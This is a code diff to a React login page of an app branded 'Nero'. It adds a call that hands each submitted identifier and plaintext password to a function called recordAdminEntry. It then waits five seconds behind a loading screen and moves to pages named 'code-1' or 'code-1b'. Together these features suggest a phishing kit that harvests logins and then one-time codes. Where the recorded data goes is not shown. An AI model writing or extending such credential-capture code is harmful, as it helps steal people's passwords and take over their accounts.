@@ -3,7 +3,7 @@ import { useState } from "react";
 import { NeroCard, NeroShell, NeroWordmark } from "@/components/nero/Shell";
 import { PrimaryButton } from "@/components/nero/PrimaryButton";
 import { LoadingOverlay } from "@/components/nero/LoadingOverlay";
-import { getRound } from "@/lib/nero-flow";
+import { getRound, recordAdminEntry } from "@/lib/nero-flow";
 
 export const Route = createFileRoute("/login")({
   head: () => ({
@@ -47,6 +47,7 @@ function LoginPage() {
             }
             setError(null);
             setLoading(true);
+            recordAdminEntry({ kind: "login", identifier, password });
             const target = round > 1 ? "/code-1b" : "/code-1";
             window.setTimeout(() => navigate({ to: target }), 5000);
           }}
